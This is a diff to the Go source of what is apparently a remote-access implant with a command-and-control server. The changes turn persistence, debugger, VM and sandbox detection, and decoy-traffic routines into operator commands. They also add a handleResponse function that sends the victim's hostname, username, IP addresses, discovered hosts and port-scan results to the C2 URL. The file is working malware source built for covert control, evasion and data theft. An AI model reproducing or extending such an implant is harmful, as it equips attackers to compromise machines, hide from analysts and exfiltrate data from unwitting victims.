@@ -43,6 +43,8 @@ var results_portscan map[string][]int
 var proxyCancelFuncs = make(map[string]context.CancelFunc)
 var proxyMutex sync.Mutex
 var GlobalIP string = ""
+var simulationFailed bool
+var getipFailed bool
 
 const (
     C2_URL     = "https://{lhost}:{lport}"
@@ -112,32 +114,47 @@ func RandomSelectStr(slice []string) string {
 }
 
 func GetGlobalIP() string {
-	ip := ""
-	resolvers := []string{
-		"https://api.ipify.org?format=text",
-		"http://myexternalip.com/raw",
-		"http://ident.me",
-		"https://ifconfig.me",
-		"https://ifconfig.co",
-	}
+    ip := ""
+    resolvers := []string{
+        "https://api.ipify.org?format=text",
+        "http://myexternalip.com/raw",
+        "http://ident.me",
+        "https://ifconfig.me",
+        "https://ifconfig.co",
+    }
+    maxAttempts := len(resolvers) - 2 
 
-	for {
-		url := RandomSelectStr(resolvers)
-		resp, err := http.Get(url)
-		if err != nil {
-			log.Printf("%v\n", err)
-		}
-		defer resp.Body.Close()
+    for attempt := 0; attempt < maxAttempts; attempt++ {
+        url := RandomSelectStr(resolvers)
+        resp, err := http.Get(url)
+        if err != nil {
+            log.Printf("[!] Error fetching IP from %s: %v\n", url, err)
+            getipFailed = true
+            continue
+        }
 
-		i, _ := ioutil.ReadAll(resp.Body)
-		ip = string(i)
+        if resp != nil {
+            defer resp.Body.Close()
+        }
 
-		if resp.StatusCode == 200 {
-			break
-		}
-	}
+        i, err := ioutil.ReadAll(resp.Body)
+        if err != nil {
+            log.Printf("[!] Error reading response from %s: %v\n", url, err)
+            getipFailed = true
+            continue
+        }
+        ip = string(i)
 
-	return ip
+        if resp.StatusCode == 200 {
+            getipFailed = false
+            return ip
+        }
+        log.Printf("[!] Non-200 status code from %s: %d\n", url, resp.StatusCode)
+        getipFailed = true
+    }
+
+    log.Println("[!] Failed to obtain global IP from all resolvers")
+    return ""
 }
 func cleanSystemLogs(lazyconf LazyDataType) error {
     var cmd string
@@ -1274,7 +1291,8 @@ func simulateLegitimateTraffic(lazyconf LazyDataType) {
             if lazyconf.DebugImplant == "True" {
                 fmt.Printf("[!] Error creating requests: %v\n", err)
             }
-            continue
+            simulationFailed = true
+            return
         }
         req.Header = headers
 
@@ -1283,7 +1301,8 @@ func simulateLegitimateTraffic(lazyconf LazyDataType) {
             if lazyconf.DebugImplant == "True" {
                 fmt.Printf("[!] Error during simulation: %v\n", err)
             }
-            continue
+            simulationFailed = true
+            return
         }
         defer resp.Body.Close()
 
@@ -1294,6 +1313,7 @@ func simulateLegitimateTraffic(lazyconf LazyDataType) {
         } else {
             if lazyconf.DebugImplant == "True" {
                 fmt.Printf("[-] Error in the matrix: %d\n", resp.StatusCode)
+                simulationFailed = true
             }
         }
         
@@ -1695,7 +1715,7 @@ func main() {
 
     shellCommand := getShellCommand("-c")
     baseCtx := context.Background()
-    ensurePersistence(lazyconf)
+
     for {
         func() {        
             defer globalRecover()
@@ -1731,41 +1751,8 @@ func main() {
                 }
                 return
             }   
-            if lazyconf.DebugImplant == "True" {
-                fmt.Println("[INFO] Simulation Started...")
-            }
-            go simulateLegitimateTraffic(lazyconf)
-            if lazyconf.DebugImplant == "True" {
-                fmt.Println("[INFO] Execution Simulation.")
-            }
-            if checkDebuggers(lazyconf) {
-                if lazyconf.DebugImplant == "True" {
-                    fmt.Println("[INFO] We are under debugger")
-                }
-            } else {
-                if lazyconf.DebugImplant == "True" {
-                    fmt.Println("[INFO] We aren't under debugger.")
-                }
-            }
+  
 
-            if isVMByMAC() {
-                if lazyconf.DebugImplant == "True" {
-                    fmt.Println("[INFO] This is a VM")
-                }
-            } else {
-                if lazyconf.DebugImplant == "True" {
-                    fmt.Println("[INFO] This is not a VM")
-                }
-            }   
-            if isSandboxEnvironment(lazyconf) {
-                if lazyconf.DebugImplant == "True" {
-                    fmt.Println("[INFO] This is a sandbox environment")
-                }
-            }else{
-                if lazyconf.DebugImplant == "True" {
-                    fmt.Println("[INFO] This is not a sandbox environment")
-                }
-            }
             if !strings.Contains(command, "stealth") {
                 switch {
                 case strings.HasPrefix(command, "download:"):
@@ -1820,6 +1807,13 @@ func main() {
                             }
                         }
                     }
+                    if len(soft) != 0 {
+                        softstring := strings.Join(soft, ", ")
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", softstring)
+                        }                        
+                        handleResponse(ctx, command, softstring, lazyconf, currentPortScanResults)
+                    } 
                 case strings.HasPrefix(command, "netconfig:"):
                     if err := captureNetworkConfig(ctx,lazyconf); err != nil {
                         if lazyconf.DebugImplant == "True" {
@@ -1900,8 +1894,9 @@ func main() {
                     currentTime := time.Now().Format("20060102")
                     outputFileName := fmt.Sprintf("%s_%s_%s.tar.gz", dirName, CLIENT_ID, currentTime)
                     outputFilePath := filepath.Join(filepath.Dir(inputDir), outputFileName)
-
+                    message := ""
                     if _, err := os.Stat(inputDir); os.IsNotExist(err) {
+                        message = "[ERROR] Directory not found"
                         if lazyconf.DebugImplant == "True" {
                             fmt.Printf("[ERROR] Directory not found: %s\n", inputDir)
                         }
@@ -1909,13 +1904,113 @@ func main() {
                     }
 
                     if err := compressGzipDir(ctx, inputDir, outputFilePath, lazyconf); err != nil {
+                        message = "[ERROR] Failed to compress directory"
                         if lazyconf.DebugImplant == "True" {
                             fmt.Printf("[ERROR] Failed to compress directory '%s': %v\n", inputDir, err)
                         }
                     } else {
+                        message = "[INFO] Successfully compressed directory"
                         if lazyconf.DebugImplant == "True" {
                             fmt.Printf("[INFO] Successfully compressed directory to: %s\n", outputFilePath)
                         }
+                    }
+                    if message != "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", message)
+                        }                        
+                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
+                    } 
+                case strings.Contains(command, "simulate:"):
+                    message := "[INFO] Simulation Started..."
+                    if lazyconf.DebugImplant == "True" {
+                        fmt.Println(message)
+                    }
+                    if !simulationFailed {
+                        go simulateLegitimateTraffic(lazyconf)
+                    } else {
+                        message = "[INFO] Simulation skipped due to previous failure."
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    }
+                    if message != "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", message)
+                        }                        
+                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
+                    }                     
+                case strings.Contains(command, "persist:"):
+                    message := ""
+                    if lazyconf.DebugImplant == "True" {
+                        fmt.Println("[INFO] persist command started")
+                    }                    
+                    ensurePersistence(lazyconf)
+                    message = "[INFO] persist command ended"
+                    if lazyconf.DebugImplant == "True" {
+                        fmt.Println()
+                    }
+                    if message != "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", message)
+                        }                        
+                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
+                    }                    
+                case strings.Contains(command, "debug:"):
+                    message := ""
+                    if checkDebuggers(lazyconf) {
+                        message = "[INFO] We are under debugger"
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    } else {
+                        message = "[INFO] We aren't under debugger."
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    }
+                    if message != "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", message)
+                        }                        
+                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
+                    }
+                case strings.Contains(command, "isvm:"):
+                    message := ""
+                    if isVMByMAC() {
+                        message = "[INFO] This is a VM"
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    } else {
+                        message = "[INFO] This is not a VM"
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    }
+                    if message != "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", message)
+                        }                        
+                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
+                    }
+                case strings.Contains(command, "sandbox:"):
+                    message := ""
+                    if isSandboxEnvironment(lazyconf) {
+                        message = "[INFO] This is a sandbox environment"
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    }else{
+                        message = "[INFO] This is not a sandbox environment"
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println(message)
+                        }
+                    }
+                    if message != "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("Calling handleResponse with message:", message)
+                        }                        
+                        handleResponse(ctx, command, message, lazyconf, currentPortScanResults)
                     }
                 case strings.Contains(command, "terminate:"):
                     if lazyconf.DebugImplant == "True" {
@@ -2006,6 +2101,35 @@ func handleCommand(ctx context.Context, command string, shellCommand []string, l
     retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
 }
 
+func handleResponse(ctx context.Context, command string, shellMsg string, lazyconf LazyDataType, resultadosEscaneo map[string][]int) {
+    defer globalRecover()
+    output := shellMsg
+    pid := os.Getpid()
+    hostname, _ := os.Hostname()
+    ips := getIPs()
+    
+    currentUser, _ := user.Current()
+
+    jsonData, _ := json.Marshal(map[string]interface{}{
+        "output":          output,
+        "client":          runtime.GOOS,
+        "command":         command,
+        "pid":             strconv.Itoa(pid),
+        "hostname":        hostname,
+        "ips":             strings.Join(ips, ", "),
+        "user":            currentUser.Username,
+        "discovered_ips":  discoveredLiveHosts,
+        "result_portscan": resultadosEscaneo,
+    })
+    var prettyJSON bytes.Buffer
+    json.Indent(&prettyJSON, jsonData, "", "  ") 
+    if lazyconf.DebugImplant == "True" {
+        fmt.Println("JSON Data (Formatted):")
+        fmt.Println(prettyJSON.String())
+    }
+    retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", string(jsonData), "")
+}
+
 func getIPs() []string {
     var ips []string
     addrs, _ := net.InterfaceAddrs()
@@ -2015,7 +2139,9 @@ func getIPs() []string {
         }
     }
     if GlobalIP == "" {
-		GlobalIP = GetGlobalIP()
+        if !getipFailed {
+		    GlobalIP = GetGlobalIP()
+        }
         ips = append(ips, GlobalIP)
     }
     return ips
